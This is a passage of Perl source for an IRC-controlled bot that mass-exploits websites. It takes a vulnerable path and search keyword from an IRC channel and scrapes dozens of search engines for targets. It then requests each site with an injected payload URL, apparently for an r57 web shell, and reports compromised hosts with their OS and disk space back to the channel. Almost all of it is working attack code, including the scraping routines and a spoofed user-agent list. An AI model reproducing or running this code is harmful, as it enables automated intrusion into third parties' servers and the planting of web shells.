}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Zizup Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Zizup");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Zizup");
}}
}}}
exit;
}}





if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @webdelist=&webde($chiave);
push(my @tot, @webdelist);
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13WebDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9WebDe Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13WebDe Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su WebDe");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su WebDe");
}}
}}}
exit;
}}}



sub scrivi()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}

sub googlet {
my @dominios = ("ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","es","fi","fr","fo","gr","com.hk","ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","ro","com.sg","com.tr","com.tw","com.ua","co.uk","hu","info","edu");
my @country = ("AE","AR","AT","AU","BE","BR","CA","CH","CL","DE","DK","ES","FI","FR","FO","GR","HK","IE","IL","IT","JP","KR","LT","LV","NL","PA","PE","PL","PT","RU","RO","SG","TR","TW","UA","HU");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $i (@dominios){
my @lista = google($i,$key,$country[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}

sub google(){
my @lst;
my $i=$_[0];
my $key=$_[1];
my $country =$_[2];
for($b=0;$b<=100;$b+=100){
my $Go=("www.google.".$i."/search?hl=en&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub guk(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.co.uk/search?hl=gb&q=".key($key)."&num=100&&hl=en&cr=countryUK|countryGB&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub gde(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.de/search?hl=gb&q=".key($key)."&num=100&&hl=en&cr=countryDE|countryDE&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub gnl(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.nl/search?hl=nl&q=".key($key)."&num=100&&hl=en&cr=countryNL|countryNL&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub gru(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.ru/search?hl=ru&q=".key($key)."&num=100&&hl=en&cr=countryRU|countryRU&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub git(){
my @lst;
my $key = $_[0];
for($a=0;$a<=1000;$a+=100){
my $Go=("http://www.google.it/search?q=".key($key)."&num=100&hl=it&as_qdr=all&start=".$a."&sa=N");
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub gat(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.at/search?hl=at&q=".key($key)."&num=100&&hl=en&cr=countryAT|countryAT&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub ges(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.es/search?hl=es&q=".key($key)."&num=100&&hl=en&cr=countryES|countryES&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavista() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ($b = 1;$b <= 1000;$b += 10) {
        my $Alt = ( "http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=". key($key) . "&stq=". $b );
        my $re = query($Alt);
        while ( $re =~ m/<span class=ngrn>(.+?)\//g ) {
            if ( $1 !~ /altavista/ ) {
                my $k = $1;
                $k =~ s/<//g;
                $k =~ s/ //g;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
        if ( $re =~ /target=\"_self\">Succ/ ) { }
        else {
            return @lst;
        }
    }
    return @lst;
}


sub altavistade(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistaus(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}



sub msn() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
        my $Msn = ( "http://www.bing.com/search?q=".key($key)."&filt=all&first=".$b."&FORM=PERE" );
        my $re = query($Msn);
        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub msnde() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
        my $Msn = ( "http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=de-de&scope=&FORM=PERE" );
        my $re = query($Msn);
        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub msnno() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $i = 1 ; $i <= 1000 ; $i += 10 ) {
        my $Msn = ( "http://search.msn.no/results.aspx?q=".key($key)."&CP=65001&first=".$i."&FORM=PERE" );
        my $re = query($Msn);
        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub msnuk() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $i = 1 ; $i <= 1000 ; $i += 10 ) {
        my $Msn = ( "http://search.msn.co.uk/results.aspx?q=".key($key)."&first=".$i."&FORM=PERE" );
        my $re = query($Msn);
        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub msncn() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $i = 1 ; $i <= 1000 ; $i += 10 ) {
        my $Msn = ( "http://cnweb.search.live.com/results.aspx?q=".key($key)."&first=".$i."&FORM=PERE3" );
        my $re = query($Msn);
        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub msnca(){ 
my @lst; 
my $key = $_[0]; 
for($b=1;$b<=2000;$b+=100){ 
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=en-ca&scope=&FORM=PERE"); 
my $Res=query($MsN); 
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
if($1 !~ /msn|live/){ 
my $k=$1; 
my @grep=links($k); 
push(@lst,@grep);}}
if ($Res =~ /nextPage disabled/)
{return @lst;}}
return @lst;
}

sub msnfr(){ 
my @lst; 
my $key = $_[0]; 
for($b=1;$b<=2000;$b+=100){ 
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=fr-fr&scope=&FORM=PERE"); 
my $Res=query($MsN); 
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
if($1 !~ /msn|live/){ 
my $k=$1; 
my @grep=links($k); 
push(@lst,@grep);}}
if ($Res =~ /nextPage disabled/)
{return @lst;}}
return @lst;
}

sub msnbe(){ 
my @lst; 
my $key = $_[0]; 
for($b=1;$b<=2000;$b+=100){ 
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=nl-be&scope=&FORM=PERE"); 
my $Res=query($MsN); 
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
if($1 !~ /msn|live/){ 
my $k=$1; 
my @grep=links($k); 
push(@lst,@grep);}}
if ($Res =~ /nextPage disabled/)
{return @lst;}}
return @lst;
} 

sub msnjp(){ 
my @lst; 
my $key = $_[0]; 
for($b=1;$b<=2000;$b+=100){ 
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=ja-jp&scope=&FORM=PERE"); 
my $Res=query($MsN); 
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
if($1 !~ /msn|live/){ 
my $k=$1; 
my @grep=links($k); 
push(@lst,@grep);}}
if ($Res =~ /nextPage disabled/)
{return @lst;}}
return @lst;
}


sub ask () {
    my $key = $_[0];
    my $name = $_[1];
    my @lst;
    my $askt = ("http://it.ask.com/web?q=".key($key)."&qsrc=1&o=312&l=dir&dm=all");
    my $asktest = query($askt);
    if ($asktest =~ /non ha prodotto alcun risultato/) {
        return @lst;
    }
    else {
        for ($p=0;$p<=20;$p++){
            my $asklink = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=612B74535B00F6CA7678625658F9B98C&dm=all&page=".$p);
            my $re = query($asklink);
            while($re =~ m/href=\"http:\/\/(.+?)\"/ig){
                my $tsite = $1;
                if ($tsite !~ /ask|wikipedia/){
                    my @grep = links($tsite);
                    open( $filez, ">>", $name );
                    foreach my $tsite (@grep) {
                        print $filez "$tsite\n";
                    }
                    close $filez;
                    push( @lst, @grep );
                }
            }
        }
        return @lst;
    }
}

sub allthewebt {
my @lang = ("en","es","de","nl","pt-BR","it","de","fo","dk","hu","no","us","fr","sv");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $lang (@lang){
my @lista = alltheweb($key,$lang[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}

sub alltheweb() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
        my $All = ( "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=". key($key) . "&o=". $i );
        my $re = query($All);
        while ( $re =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/ig ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            open( $filez, ">>", $name );
            foreach my $k (@grep) {
                print $filez "$k\n";
            }
            close $filez;
            push( @lst, @grep );
        }
    }
    return @lst;
}


sub powersearch()
{
my @lst;
my $key=$_[0];
my $i=0;
for($i=0; $i<=760; $i+=10)
{
my $pow=("http://www.baidu.com/s?lm=0&si=&rn=10&ie=gb2312&ct=0&wd=".key($key)."&pn=".$i."&ver=0&cl=3");
my $Res=query($pow);
while($Res =~ m/href=\"http:\/\/(.*?)\"/ig){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub sensis()
{
my @lst;
my $key=$_[0];
my $i=0;
for($i=1; $i<=100; $i+=1)
{
my $sens=("http://www.sensis.com.au/search.do?startPage=".$i."&pgNxt=&find=".key($key)."&profile=au_web_only&location=&partnerId=");
my $Res=query($sens);
while($Res =~ m/href=\"http:\/\/(.*?)\"/ig){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub msnit()
{
my @lst;
my $key  = $_[0];
for ($i = 1 ;$i <= 1000 ;$i += 10) {
my $msnit = ("http://search.msn.it/results.aspx?q=".key($key)."&first=".$i."&FORM=PORE");
my $re = query($msnit);
while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
my $k = $1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub altacom(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlTa=("http://www.altavista.com/web/results?itag=ody&kgs=3&q=".key($key)."&stq=".$b);
my $Res=query($AlTa);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}



sub highit(){
my @lst;
my $key=$_[0];
my $i=0;
for($i=0; $i<=1000; $i+=10)
{
my $higit=("http://ita.hispeed.ch/Ricerca/?st=s&q2=".key($key)."&q3=&q4=&q5=&l2=&l3q=i&l3=&l4=all&l5=any&l6q=i&l6=&l7=Array&rl=10&fi=".$i."&q1=".key($key)."&submitbutton=Ricerca&l1=web");
my $Res=query($higit);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\"/ig){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub high(){
my @lst;
my $key=$_[0];
my $i=0;
for($i=0; $i<=1000; $i+=10)
{
my $higit=("http://eng.hispeed.ch/Search/?st=s&q2=".key($key)."&q3=&q4=&q5=&l2=&l3q=i&l3=&l4=all&l5=any&l6q=i&l6=&l7=Array&rl=10&fi=".$i."&q1=".key($key)."&submitbutton=Search&l1=web");
my $Res=query($higit);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\"/ig){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub uol(){
my @lst;
my $key = $_[0];
for($i=0;$i<=1000;$i+=10){
my $UoL=("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/(.+?)\">/ig){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub sapo(){
my @lst;
my $key = $_[0];
for($i=1;$i<=100;$i+=1){
my $Sapo=("http://pesquisa.sapo.pt/search?page=".$i."&location=pt&st=.pt&barra=resumo&q=".key($key));
my $Res=query($Sapo);
while($Res =~ m/href=\"?http:\/\/(.+?)\"/ig){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


#####
# SUBS Yahoo
#####
sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $Ya=("http://www.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res=query($Ya);
while ($Res =~ m/26u=(.*?)%26w=/g) {
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}



sub webde () {
    my $key = $_[0];
    my $name = $_[1];
    my @lst;
    for $p(1..50){
        my $webdelink = ("http://suche.web.de/search/web/?pageIndex=".$p."&su=".key($key)."&y=0&x=0&mc=suche@web@navigation@zahlen.suche@web");
        my $re = query($webdelink);
        while($re =~ m/href=\"http:\/\/(.+?)\">/ig) {
            my $tsite = $1;
            if ($tsite !~ /\/search\/web|web.de|\" class=\"neww\"/){
                my @grep = links($tsite);
                open( $filez, ">>", $name );
                foreach my $tsite (@grep) {
                    print $filez "$tsite\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}




sub nigma(){
my @lst;
my $key=$_[0];
for($b=1;$b<=1000;$b+=20){
my $nig=("http://nigma.ru/index.php?s=".key($key)."&gl=1&yh=1&ms=1&yn=1&rm=1&av=1&ap=1&nm=1&k=8oRJ&startpos=".$b);
my $Res=query($nig);
while ($Res=~ m/href=\"http:\/\/(.+?)\"/ig){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub zizup(){
my @lst;
my @a;
my $key=$_[0];
for($i=1;$i<=100;$i++){
my $zizup=("http://www.zizup.com/search.php?type=Web&c=1&index=".$i."&search=".key($key));
my $Res=query($zizup);
while ($Res=~ m/<a href=\"http:\/\/(.*?)\"/ig){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}



sub india(){
my $key=$_[0];
my @lst;
my $pg=0;
for($i=0; $i<=1000;$i+=10) {
my $ind=("http://indiainfo-search.altavista.com/search?kl=XX&search=Search&what=web&dp=&q=".key($key)."&stq=".$i);
my $Res=query($ind);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target=\"_self\">/ig){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub cuil() {
    my @lst;
    my $key = $_[0];
    my $Go=("http://www.cuil.com/search?q=".key($key));
	my $Res=query($Go);
	while ($Res =~ /id="a_next" href="(.*?)">/) {
		my $next = $1;
		while ($Res =~ m/<a class="url" href="http:\/\/(.*?)"/g) {
			my $k=$1;
			my @grep=links($k);
			push(@lst,@grep);
		}
		$Res=query("http://www.cuil.com/search".$next);
	}
	return @lst;
}

sub ask2() {
    my @lst;
	my $pag = 1;
    my $key = $_[0];
    my $Go = "http://www.ask.com/web?q=".key($key)."&page=".$pag."&dm=all";
	my $Res=query($Go);
	if ($Res =~ //) { 
		$ban = 1;
	}	
	while ($Res =~ />Next/) {
		while ($Res =~ m/href="http:\/\/(.+?)" onmousedown=/g) {
            if ($1 !~ /ask\.com|cache/){		
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);				
            }			
		}
		$pag += 1;
		$Go = "http://www.ask.com/web?q=".key($key)."&page=".$pag."&dm=all";
		$Res=query($Go);		
	}
return @lst;
}



sub work2() {
my $dork  = $_[0];
my $name = $_[1];
for ($i = 0;$i <= 80;$i += 1) {
my $mlink = ( "http://search.walla.co.il/?t=0&e=utf&q=".key($dork)."&p=".$i);
my $re = query($mlink);
while ($re =~ m/<td class=sw><a href=\"http:\/\/(.*?)\//g) {
my $k = $1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub work3() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 990;$i += 10) {
        my $mlink = ( "http://search1.rediff.com/dirsrch/default.asp?MT=".key($dork)."&iss=&submit=Search&firstres=".$i);
        my $re = query($mlink);
        while ($re =~ m/onmousedown=\"return enc\(this\, \'http:\/\/(.*?)\//g) {
            my $k = $1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub szukacz() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 400;$i += 20) {
        my $mlink = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&enc=iso-8859-2&q=".key($dork)."&start=".$i);
        my $re = query($mlink);
        while ($re =~ m/<a title=\"?http:\/\/(.+?)\//g) {
my $k = $1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub onet() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 10;$i += 1) {
        my $mlink = ( "http://szukaj.onet.pl/query.html?qt=".key($dork)."&p=".$i);
        my $re = query($mlink);
        while ($re =~ m/<span class=\"?clurl\"?>http:\/\/(.+?)\//g) {
           my $k = $1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}



sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub Agent(){
    my @ret = (
    "Microsoft Internet Explorer/4.0b1 (Windows 95)",
    "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
    "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
    "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
    "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Microsoft Pocket Internet Explorer/0.6",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
    "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
    "Advanced Browser (http://www.avantbrowser.com)",
    "Avant Browser (http://www.avantbrowser.com)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
    "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
    "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
    "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
